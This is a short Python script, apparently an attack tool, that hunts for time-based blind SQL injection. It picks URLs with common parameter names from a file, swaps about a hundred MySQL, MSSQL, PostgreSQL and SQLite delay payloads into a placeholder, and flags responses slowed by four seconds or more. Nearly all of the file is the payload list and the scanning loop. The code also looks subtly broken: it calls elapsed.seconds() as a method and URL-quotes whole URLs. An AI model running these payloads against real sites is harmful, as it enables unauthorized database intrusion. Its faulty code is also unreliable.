import requests
import urllib.parse
def discovery():
    patterns= ["id=",
        "select=",
        "report=",
        "role=",
        "update=",
        "query=",
        "user=",
        "name=",
        "sort=",
        "where=",
        "search=",
        "params=",
        "process=",
        "row=",
        "view=",
        "table=",
        "from=",
        "sel=",
        "results=",
        "sleep=",
        "fetch=",
        "order=",
        "keyword=",
        "column=",
        "field=",
        "delete=",
        "string=",
        "number=",
        "filter="
    ]
    payloads = ['sleep(5)#',
 '1 or sleep(5)#',
 '" or sleep(5)#',
 "' or sleep(5)#",
 '" or sleep(5)="',
 "' or sleep(5)='",
 '1) or sleep(5)#',
 '") or sleep(5)="',
 "') or sleep(5)='",
 '1)) or sleep(5)#',
 '")) or sleep(5)="',
 "')) or sleep(5)='",
 ";waitfor delay '0:0:5'--",
 ");waitfor delay '0:0:5'--",
 "';waitfor delay '0:0:5'--",
 '";waitfor delay \'0:0:5\'--',
 "');waitfor delay '0:0:5'--",
 '");waitfor delay \'0:0:5\'--',
 "));waitfor delay '0:0:5'--",
 "'));waitfor delay '0:0:5'--",
 '"));waitfor delay \'0:0:5\'--',
 'benchmark(10000000,MD5(1))#',
 '1 or benchmark(10000000,MD5(1))#',
 '" or benchmark(10000000,MD5(1))#',
 "' or benchmark(10000000,MD5(1))#",
 '1) or benchmark(10000000,MD5(1))#',
 '") or benchmark(10000000,MD5(1))#',
 "') or benchmark(10000000,MD5(1))#",
 '1)) or benchmark(10000000,MD5(1))#',
 '")) or benchmark(10000000,MD5(1))#',
 "')) or benchmark(10000000,MD5(1))#",
 'pg_sleep(5)--',
 '1 or pg_sleep(5)--',
 '" or pg_sleep(5)--',
 "' or pg_sleep(5)--",
 '1) or pg_sleep(5)--',
 '") or pg_sleep(5)--',
 "') or pg_sleep(5)--",
 '1)) or pg_sleep(5)--',
 '")) or pg_sleep(5)--',
 "')) or pg_sleep(5)--",
 "AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe",
 "AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='",
 'AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)',
 'AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--',
 'AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#',
 'SLEEP(5)#',
 'SLEEP(5)--',
 'SLEEP(5)="',
 "SLEEP(5)='",
 'or SLEEP(5)',
 'or SLEEP(5)#',
 'or SLEEP(5)--',
 'or SLEEP(5)="',
 "or SLEEP(5)='",
 "waitfor delay '00:00:05'",
 "waitfor delay '00:00:05'--",
 "waitfor delay '00:00:05'#",
 'benchmark(50000000,MD5(1))',
 'benchmark(50000000,MD5(1))--',
 'benchmark(50000000,MD5(1))#',
 'or benchmark(50000000,MD5(1))',
 'or benchmark(50000000,MD5(1))--',
 'or benchmark(50000000,MD5(1))#',
 'pg_SLEEP(5)',
 'pg_SLEEP(5)--',
 'pg_SLEEP(5)#',
 'or pg_SLEEP(5)',
 'or pg_SLEEP(5)--',
 'or pg_SLEEP(5)#',
 'AnD SLEEP(5)',
 'AnD SLEEP(5)--',
 'AnD SLEEP(5)#',
 '&&SLEEP(5)',
 '&&SLEEP(5)--',
 '&&SLEEP(5)#',
 "' AnD SLEEP(5) ANd '1",
 "'&&SLEEP(5)&&'1",
 'ORDER BY SLEEP(5)',
 'ORDER BY SLEEP(5)--',
 'ORDER BY SLEEP(5)#',
 '(SELECT * FROM (SELECT(SLEEP(5)))ecMj)',
 '(SELECT * FROM (SELECT(SLEEP(5)))ecMj)#',
 '(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--',
 "+benchmark(3200,SHA1(1))+'",
 "+ SLEEP(10) + '",
 'RANDOMBLOB(500000000/2)',
 "AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))",
 "OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))",
 'RANDOMBLOB(1000000000/2)',
 "AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))",
 "OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))",
 'SLEEP(1)/*\' or SLEEP(1) or \'" or SLEEP(1) or "*/']

    file = open("param","r")
    for i in file.readlines():
        for j in patterns:
            if j in i :
                first_ready=urllib.parse.quote(i)
                first = requests.get(first_ready)
                first_time=first.elapsed.seconds()
                for zz in payloads:
                    rep = i.replace("RFUZZ",zz)
                    second_ready=urllib.parse.quote(rep)
                    second = requests.get(second_ready)
                    second_time = second.elapsed.seconds()
                    if second_time - first_time >=4:
                        print(second_ready)

